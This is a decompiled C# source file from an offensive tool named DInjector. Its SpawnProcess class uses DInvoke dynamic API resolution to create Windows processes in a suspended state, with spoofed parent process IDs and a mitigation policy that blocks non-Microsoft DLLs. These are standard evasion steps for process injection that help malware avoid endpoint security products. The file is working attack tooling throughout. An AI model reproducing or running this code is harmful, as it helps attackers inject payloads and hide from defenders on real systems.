using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using DInvoke.Data;
using DInvoke.DynamicInvoke;

namespace DInjector
{
	// Token: 0x02000018 RID: 24
	internal class SpawnProcess
	{
		// Token: 0x17000001 RID: 1
		// (get) Token: 0x06000045 RID: 69 RVA: 0x000052FC File Offset: 0x000034FC
		public static bool Is64Bit
		{
			get
			{
				return IntPtr.Size == 8;
			}
		}

		// Token: 0x06000046 RID: 70 RVA: 0x00005308 File Offset: 0x00003508
		public static bool initializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, ref IntPtr lpSize)
		{
			object[] array = new object[]
			{
				lpAttributeList,
				dwAttributeCount,
				0,
				lpSize
			};
			bool result = (bool)Generic.DynamicAPIInvoke("kernel32.dll", "InitializeProcThreadAttributeList", typeof(SpawnProcess.InitializeProcThreadAttributeList), ref array, false, true);
			lpSize = (IntPtr)array[3];
			return result;
		}

		// Token: 0x06000047 RID: 71 RVA: 0x00005370 File Offset: 0x00003570
		public static bool updateProcThreadAttribute(IntPtr lpAttributeList, IntPtr attribute, IntPtr lpValue)
		{
			object[] array = new object[]
			{
				lpAttributeList,
				0U,
				attribute,
				lpValue,
				(IntPtr)IntPtr.Size,
				IntPtr.Zero,
				IntPtr.Zero
			};
			return (bool)Generic.DynamicAPIInvoke("kernel32.dll", "UpdateProcThreadAttribute", typeof(SpawnProcess.UpdateProcThreadAttribute), ref array, true, true);
		}

		// Token: 0x06000048 RID: 72 RVA: 0x000053F8 File Offset: 0x000035F8
		public static bool deleteProcThreadAttributeList(IntPtr lpAttributeList)
		{
			object[] array = new object[]
			{
				lpAttributeList
			};
			return (bool)Generic.DynamicAPIInvoke("kernel32.dll", "DeleteProcThreadAttributeList", typeof(SpawnProcess.DeleteProcThreadAttributeList), ref array, false, true);
		}

		// Token: 0x06000049 RID: 73 RVA: 0x00005438 File Offset: 0x00003638
		public static bool createProcessA(string applicationName, string workingDirectory, uint creationFlags, Win32.ProcessThreadsAPI._STARTUPINFOEX startupInfoEx, out Win32.ProcessThreadsAPI._PROCESS_INFORMATION processInformation)
		{
			Win32.WinBase.SECURITY_ATTRIBUTES security_ATTRIBUTES = default(Win32.WinBase.SECURITY_ATTRIBUTES);
			Win32.WinBase.SECURITY_ATTRIBUTES security_ATTRIBUTES2 = default(Win32.WinBase.SECURITY_ATTRIBUTES);
			Win32.ProcessThreadsAPI._PROCESS_INFORMATION process_INFORMATION = default(Win32.ProcessThreadsAPI._PROCESS_INFORMATION);
			object[] array = new object[]
			{
				applicationName,
				null,
				security_ATTRIBUTES,
				security_ATTRIBUTES2,
				false,
				creationFlags,
				IntPtr.Zero,
				workingDirectory,
				startupInfoEx,
				process_INFORMATION
			};
			bool flag = (bool)Generic.DynamicAPIInvoke("kernel32.dll", "CreateProcessA", typeof(SpawnProcess.CreateProcessA), ref array, false, true);
			if (!flag)
			{
				processInformation = process_INFORMATION;
			}
			processInformation = (Win32.ProcessThreadsAPI._PROCESS_INFORMATION)array[9];
			return flag;
		}

		// Token: 0x0600004A RID: 74 RVA: 0x000054F0 File Offset: 0x000036F0
		public static Win32.ProcessThreadsAPI._PROCESS_INFORMATION Execute(string processImage, string workingDirectory, bool suspended, int ppid, bool blockDlls)
		{
			Win32.ProcessThreadsAPI._STARTUPINFOEX startupinfoex = default(Win32.ProcessThreadsAPI._STARTUPINFOEX);
			startupinfoex.StartupInfo.cb = (uint)Marshal.SizeOf(startupinfoex);
			startupinfoex.StartupInfo.dwFlags = 1U;
			IntPtr intPtr = Marshal.AllocHGlobal(IntPtr.Size);
			IntPtr zero = IntPtr.Zero;
			int num = 0;
			if (ppid != 0)
			{
				num++;
			}
			if (blockDlls)
			{
				num++;
			}
			SpawnProcess.initializeProcThreadAttributeList(IntPtr.Zero, num, ref zero);
			startupinfoex.lpAttributeList = Marshal.AllocHGlobal(zero);
			if (SpawnProcess.initializeProcThreadAttributeList(startupinfoex.lpAttributeList, num, ref zero))
			{
				Console.WriteLine("(SpawnProcess) [+] InitializeProcThreadAttributeList");
				if (blockDlls)
				{
					Marshal.WriteIntPtr(intPtr, SpawnProcess.Is64Bit ? new IntPtr(Win32.Kernel32.BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON) : new IntPtr((long)((ulong)((uint)Win32.Kernel32.BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON))));
					if (!SpawnProcess.updateProcThreadAttribute(startupinfoex.lpAttributeList, (IntPtr)((long)((ulong)Win32.Kernel32.PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY)), intPtr))
					{
						throw new Exception("(SpawnProcess) [-] UpdateProcThreadAttribute (blockDLLs)");
					}
					Console.WriteLine("(SpawnProcess) [+] UpdateProcThreadAttribute (blockDLLs)");
				}
				if (ppid != 0)
				{
					IntPtr handle = Process.GetProcessById(ppid).Handle;
					intPtr = Marshal.AllocHGlobal(IntPtr.Size);
					Marshal.WriteIntPtr(intPtr, handle);
					if (!SpawnProcess.updateProcThreadAttribute(startupinfoex.lpAttributeList, (IntPtr)((long)((ulong)Win32.Kernel32.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)), intPtr))
					{
						throw new Exception("(SpawnProcess) [-] UpdateProcThreadAttribute (PPID)");
					}
					Console.WriteLine("(SpawnProcess) [+] UpdateProcThreadAttribute (PPID)");
				}
				uint num2 = Win32.Kernel32.EXTENDED_STARTUPINFO_PRESENT;
				if (suspended)
				{
					num2 |= 4U;
				}
				Win32.ProcessThreadsAPI._PROCESS_INFORMATION result;
				if (SpawnProcess.createProcessA(processImage, workingDirectory, num2, startupinfoex, out result))
				{
					Console.WriteLine("(SpawnProcess) [+] CreateProcessA");
				}
				else
				{
					Console.WriteLine("(SpawnProcess) [-] CreateProcessA");
				}
				SpawnProcess.deleteProcThreadAttributeList(startupinfoex.lpAttributeList);
				Marshal.FreeHGlobal(intPtr);
				return result;
			}
			throw new Exception("(SpawnProcess) [-] InitializeProcThreadAttributeList");
		}

		// Token: 0x0200007F RID: 127
		// (Invoke) Token: 0x0600014F RID: 335
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

		// Token: 0x02000080 RID: 128
		// (Invoke) Token: 0x06000153 RID: 339
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

		// Token: 0x02000081 RID: 129
		// (Invoke) Token: 0x06000157 RID: 343
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);

		// Token: 0x02000082 RID: 130
		// (Invoke) Token: 0x0600015B RID: 347
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate bool CreateProcessA(string lpApplicationName, string lpCommandLine, ref Win32.WinBase.SECURITY_ATTRIBUTES lpProcessAttributes, ref Win32.WinBase.SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref Win32.ProcessThreadsAPI._STARTUPINFOEX lpStartupInfoEx, out Win32.ProcessThreadsAPI._PROCESS_INFORMATION lpProcessInformation);
	}
}
